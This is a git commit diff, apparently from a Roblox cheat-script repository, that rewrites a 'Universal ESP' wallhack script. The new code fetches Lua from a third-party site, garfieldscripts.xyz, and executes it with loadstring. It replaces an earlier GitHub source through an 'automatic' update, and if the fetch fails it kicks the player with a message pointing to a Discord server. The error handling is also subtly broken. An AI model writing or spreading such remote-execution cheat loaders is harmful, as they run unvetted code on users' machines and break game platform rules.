487a4dc63707a41bb0b9c17cf4631766ec994e5f
Emil Toth <emiltoth1870@gmail.com>
2023-04-16 22:34:38 +0200

    Updated automatically!

--- Scripts/Autoadd/Universal ESP.lua
+++ Scripts/Autoadd/Universal ESP.lua
@@ -1,1 +1,7 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/espice", true))()
+local Status, Script = pcall(loadstring(game:HttpGet('https://garfieldscripts.xyz/cheatx/scripts/main.lua'))())
+
+if Status then 
+    loadstring(Script)()
+else 
+    game.Players.LocalPlayer:Kick("\nCould not establish a connection to the server. The server may be down. Join the Discord server at garfieldscripts.xyz/discord (Copy it into your browser) for more info/help")
+end
